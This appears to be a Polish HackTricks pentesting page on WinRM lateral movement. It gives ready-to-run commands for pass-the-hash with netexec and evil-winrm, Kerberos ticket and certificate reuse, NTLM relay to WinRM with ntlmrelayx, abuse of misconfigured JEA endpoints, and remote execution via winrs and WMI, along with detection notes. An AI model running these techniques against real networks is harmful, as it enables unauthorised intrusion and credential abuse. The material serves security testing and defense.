# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM to jeden z najwygodniejszych transportów do **lateral movement** w środowiskach Windows, ponieważ zapewnia zdalną powłokę przez **WS-Man/HTTP(S)** bez potrzeby stosowania sztuczek polegających na tworzeniu usług SMB. Jeśli cel udostępnia port **5985/5986**, a Twoje konto może korzystać ze zdalnego zarządzania, często możesz bardzo szybko przejść od „prawidłowych poświadczeń” do „interaktywnej powłoki”.

Informacje o **enumeracji protokołu/usługi**, listenerach, włączaniu WinRM, `Invoke-Command` i ogólnym użyciu klienta znajdziesz tutaj:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Dlaczego operatorzy lubią WinRM

- Używa **HTTP/HTTPS** zamiast SMB/RPC, więc często działa tam, gdzie blokowane jest uruchamianie kodu w stylu PsExec.
- Przy użyciu **Kerberos** nie wysyła na cel poświadczeń, których można ponownie użyć.
- Działa bezproblemowo z narzędziami dla **Windows**, **Linux** i **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktywna ścieżka zdalnego zarządzania PowerShell uruchamia na celu **`wsmprovhost.exe`** w kontekście uwierzytelnionego użytkownika, co operacyjnie różni się od uruchamiania kodu za pomocą usług.

## Model dostępu i wymagania wstępne

W praktyce skuteczny lateral movement przez WinRM zależy od **trzech** rzeczy:

1. Cel ma listener **WinRM** (`5985`/`5986`) i reguły zapory zezwalające na dostęp.
2. Konto może **uwierzytelnić się** w punkcie końcowym.
3. Konto ma uprawnienia do **otwarcia sesji zdalnego zarządzania**.

Typowe sposoby uzyskania takiego dostępu:

- Uprawnienia **Local Administrator** na celu.
- Członkostwo w grupie **Remote Management Users** w nowszych systemach lub **WinRMRemoteWMIUsers__** w systemach/komponentach, które nadal uwzględniają tę grupę.
- Jawnie przyznane uprawnienia do zdalnego zarządzania, delegowane za pomocą lokalnych deskryptorów zabezpieczeń lub zmian ACL zdalnego zarządzania PowerShell.

Jeśli masz już kontrolę nad komputerem z uprawnieniami administratora, pamiętaj, że możesz również **delegować dostęp WinRM bez członkostwa w pełnej grupie administratorów**, korzystając z technik opisanych tutaj:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Pułapki związane z uwierzytelnianiem, które mają znaczenie podczas lateral movement

- **Kerberos wymaga nazwy hosta/FQDN**. Jeśli łączysz się przez adres IP, klient zwykle przełącza się na **NTLM/Negotiate**.
- W przypadku **workgroup** lub nietypowych sytuacji związanych z relacjami zaufania NTLM często wymaga **HTTPS** albo dodania celu do listy **TrustedHosts** na kliencie.
- W przypadku kont lokalnych korzystających z Negotiate w workgroup ograniczenia zdalne UAC mogą uniemożliwić dostęp, chyba że używane jest wbudowane konto Administratora lub ustawiono `LocalAccountTokenFilterPolicy=1`.
- Domyślnie zdalne zarządzanie PowerShell używa **`HTTP/<host>` SPN**. W środowiskach, w których `HTTP/<host>` jest już zarejestrowany dla innego konta usługi, uwierzytelnianie Kerberos WinRM może zakończyć się błędem `0x80090322`; użyj SPN z określonym portem albo przełącz się na **`WSMAN/<host>`**, jeśli ten SPN istnieje.<sup>[[3]](#references)</sup>

Jeśli podczas password spraying uzyskasz prawidłowe poświadczenia, sprawdzenie ich przez WinRM to często najszybszy sposób, by ustalić, czy pozwalają uzyskać powłokę:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement z Linux do Windows

### NetExec / CrackMapExec do weryfikacji i jednorazowego uruchamiania poleceń

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM do interaktywnych powłok

`evil-winrm` pozostaje najwygodniejszą opcją do interaktywnej pracy z systemu Linux, ponieważ obsługuje **hasła**, **hashe NT**, **bilety Kerberos**, **certyfikaty klienta**, transfer plików oraz ładowanie PowerShell/.NET do pamięci.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Przypadek brzegowy Kerberos SPN: `HTTP` vs `WSMAN`

Gdy domyślny SPN **`HTTP/<host>`** powoduje błędy Kerberos, spróbuj zażądać/użyć biletu **`WSMAN/<host>`**. Zdarza się to w zaostrzonych pod względem bezpieczeństwa lub nietypowych środowiskach korporacyjnych, w których **`HTTP/<host>`** jest już przypisany do innego konta usługi.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

This przydaje się również po nadużyciu **RBCD / S4U**, gdy celowo sfałszowano lub zażądano biletu usługi **WSMAN**, a nie ogólnego biletu `HTTP`.

### Uwierzytelnianie certyfikatem

WinRM obsługuje również **uwierzytelnianie certyfikatem klienta**, ale certyfikat musi być mapowany na koncie **lokalnym** na hoście docelowym. Z perspektywy ofensywnej ma to znaczenie, gdy:

- skradziono lub wyeksportowano prawidłowy certyfikat klienta i klucz prywatny, które są już mapowane na potrzeby WinRM;
- nadużyto **AD CS / Pass-the-Certificate**, aby uzyskać certyfikat dla principal, a następnie przejść do innej ścieżki uwierzytelniania;
- działasz w środowiskach, które celowo unikają zdalnego dostępu opartego na hasłach.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Uwierzytelnianie WinRM za pomocą certyfikatu klienta jest znacznie rzadsze niż uwierzytelnianie hasłem, hashem lub Kerberosem, ale gdy jest dostępne, może zapewnić ścieżkę **lateral movement bez hasła**, która działa również po zmianie hasła.

### Python / automatyzacja z `pypsrp`

Jeśli potrzebujesz automatyzacji zamiast powłoki operatora, `pypsrp` zapewnia obsługę WinRM/PSRP z poziomu Pythona, w tym **NTLM**, **uwierzytelnianie certyfikatem**, **Kerberos** i **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Jeśli potrzebujesz większej kontroli niż zapewnia wysokopoziomowy wrapper `Client`, przydatne są niższego poziomu API `WSMan` + `RunspacePool`, które rozwiązują dwa częste problemy operatorów:

- wymuszanie **`WSMAN`** jako usługi/SPN Kerberos zamiast domyślnego `HTTP`, którego oczekuje wielu klientów PowerShell;
- łączenie się z **niestandardowym endpointem PSRP**, takim jak konfiguracja sesji **JEA** / niestandardowa konfiguracja sesji, zamiast `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Niestandardowe endpointy PSRP i JEA mają znaczenie podczas ruchu lateralnego

Pomyślne uwierzytelnienie WinRM **nie zawsze** oznacza, że uzyskasz dostęp do domyślnego, nieograniczonego endpointu `Microsoft.PowerShell`. Dojrzałe środowiska mogą udostępniać **niestandardowe konfiguracje sesji** lub endpointy **JEA** z własnymi ACL-ami i ustawieniami konta, w którego kontekście są uruchamiane.<sup>[[1]](#references)</sup>

Jeśli masz już możliwość wykonywania kodu na hoście Windows i chcesz sprawdzić dostępne powierzchnie zdalnego dostępu, wylistuj zarejestrowane endpointy:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Gdy dostępny jest przydatny endpoint, wskazuj go jawnie zamiast korzystać z domyślnej powłoki:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Praktyczne konsekwencje ofensywne:

- Nawet **ograniczony** endpoint może wystarczyć do lateral movement, jeśli udostępnia odpowiednie cmdlety/funkcje do kontrolowania usług, dostępu do plików, tworzenia procesów lub wykonywania dowolnego kodu .NET / poleceń zewnętrznych.
- **Błędnie skonfigurowana JEA** jest szczególnie cenna, gdy udostępnia niebezpieczne polecenia, takie jak `Start-Process`, szerokie symbole wieloznaczne, zapisywalne providery lub niestandardowe funkcje proxy pozwalające ominąć zamierzone ograniczenia.
- Endpointy korzystające z **wirtualnych kont RunAs** lub **gMSA** zmieniają kontekst zabezpieczeń, w którym wykonywane są polecenia. W szczególności endpoint oparty na gMSA może zapewnić **tożsamość sieciową przy drugim przeskoku**, nawet gdy zwykła sesja WinRM napotka klasyczny problem delegowania.

W przypadku niestandardowego, ograniczonego endpointu osobno sprawdź jego efektywne uprawnienia do poleceń i skryptów: krótka lista `Get-Command` sama w sobie nie dowodzi, że nie można uruchomić istniejącego pliku `.ps1`. [Możliwości ról JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) jawnie określają, które ścieżki skryptów można wywoływać; inne niestandardowe endpointy mogą stosować odmienne reguły sesji. Jeśli dozwolony skrypt używa zapisanej wartości `SecureString` do utworzenia poświadczeń dla innego hosta, blob utworzony bez jawnego klucza korzysta z [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) i do odszyfrowania zazwyczaj wymaga kontekstu użytkownika oraz komputera, które go chroniły. Zanim uznasz zapisywalne źródło lub skopiowany blob za ścieżkę eskalacji między hostami, sprawdź ACL skryptu, dozwolony sposób jego wywołania, tożsamość używaną do uruchomienia oraz uprawnienia do poświadczeń w systemach docelowych. Podczas pasywnej enumeracji nie wyświetlaj chronionej wartości.

W przypadku niestandardowej funkcji JEA przyjmującej ścieżkę pliku sprawdź łącznie ACL zarejestrowanego endpointu, przypisaną funkcję roli i efektywną tożsamość używaną do uruchomienia. Wywołujący może mieć ustawienie `NoLanguage`, podczas gdy treść funkcji działa w domyślnym trybie języka systemu; wirtualne konto może też mieć lokalne uprawnienia administratora. Jeśli funkcja sprawdza dozwolony katalog za pomocą zwykłego prefiksu tekstowego, a następnie odczytuje podaną ścieżkę, elementy `..` mogą prowadzić poza ten katalog. Granicę stanowi rozstrzygnięta ścieżka w kontekście tożsamości funkcji, a nie tryb języka wywołującego ani widoczny prefiks. Zanim uznasz, że możliwy jest uprzywilejowany odczyt pliku na podstawie dostępnego pliku `.psrc` lub `.pssc`, potwierdź, że dana funkcja jest osiągalna i że końcowa ścieżka jest walidowana. Zobacz wskazówki Microsoft dotyczące [możliwości ról JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) i [kwestii bezpieczeństwa](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Lateral movement przez natywny mechanizm WinRM w Windows

### `winrs.exe`

`winrs.exe` jest wbudowanym narzędziem przydatnym, gdy chcesz **natywnie wykonywać polecenia przez WinRM** bez otwierania interaktywnej sesji zdalnej PowerShell:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Dwie flagi łatwo przeoczyć, a w praktyce mają znaczenie:

- `/noprofile` jest często wymagane, gdy zdalny podmiot nie jest **lokalnym administratorem**.
- `/allowdelegate` umożliwia zdalnej powłoce używanie Twoich poświadczeń w komunikacji z **trzecim hostem** (na przykład gdy polecenie wymaga dostępu do `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

W praktyce użycie `winrs.exe` często prowadzi do zdalnego łańcucha procesów podobnego do:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Warto o tym pamiętać, ponieważ różni się to od exec opartego na usługach i interaktywnych sesji PSRP.

### `winrm.cmd` / WS-Man COM zamiast PowerShell remoting

Możesz również wykonywać polecenia przez **transport WinRM** bez użycia `Enter-PSSession`, wywołując klasy WMI za pośrednictwem WS-Man. Transport nadal odbywa się przez WinRM, ale prymitywem zdalnego wykonywania staje się **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

To podejście jest przydatne, gdy:

- Logowanie PowerShell jest intensywnie monitorowane.
- Chcesz używać **transportu WinRM**, ale nie klasycznego workflow zdalnego PowerShell.
- Tworzysz lub używasz niestandardowych narzędzi opartych na obiekcie COM **`WSMan.Automation`**.

## NTLM relay do WinRM (WS-Man)

Gdy relay SMB jest blokowany przez wymóg podpisywania, a relay LDAP jest ograniczony, **WS-Man/WinRM** może nadal być atrakcyjnym celem relay. Nowoczesny `ntlmrelayx.py` obsługuje **serwery relay WinRM** i może przekazywać uwierzytelnianie do celów **`wsman://`** lub **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Dwie praktyczne uwagi:

- Relay jest najbardziej przydatny, gdy cel akceptuje **NTLM**, a przekazywana tożsamość może korzystać z WinRM.
- Nowszy kod Impacket obsługuje specjalnie żądania **`WSMANIDENTIFY: unauthenticated`**, dzięki czemu sondy w stylu `Test-WSman` nie przerywają przepływu relay.

Informacje o ograniczeniach związanych z wieloma przeskokami po uzyskaniu pierwszej sesji WinRM znajdziesz tutaj:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Uwagi dotyczące OPSEC i wykrywania

- **Interaktywne zdalne sesje PowerShell** zwykle uruchamiają na celu proces **`wsmprovhost.exe`**.
- **`winrs.exe`** zwykle uruchamia **`winrshost.exe`**, a następnie żądany proces potomny.
- Niestandardowe punkty końcowe **JEA** mogą wykonywać działania jako konta wirtualne **`WinRM_VA_*`** lub skonfigurowane konto **gMSA**, co zmienia zarówno telemetrię, jak i zachowanie przy drugim przeskoku w porównaniu ze zwykłą powłoką działającą w kontekście użytkownika.<sup>[[1]](#references)</sup>
- Jeśli używasz PSRP zamiast surowego `cmd.exe`, spodziewaj się telemetrii logowania sieciowego, zdarzeń usługi WinRM oraz rejestrowania operacyjnego/skryptowych bloków PowerShell.
- Jeśli potrzebujesz tylko jednego polecenia, `winrs.exe` lub jednorazowe wykonanie przez WinRM może być mniej widoczne niż długotrwała interaktywna sesja zdalna.
- Jeśli dostępny jest Kerberos, preferuj **FQDN + Kerberos** zamiast IP + NTLM, aby ograniczyć zarówno problemy z zaufaniem, jak i kłopotliwe zmiany po stronie klienta w `TrustedHosts`.

## References

- [1] [Microsoft: Zagadnienia bezpieczeństwa JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [README pypsrp](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Błąd `0x80090322` podczas łączenia PowerShell ze zdalnym serwerem przez WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
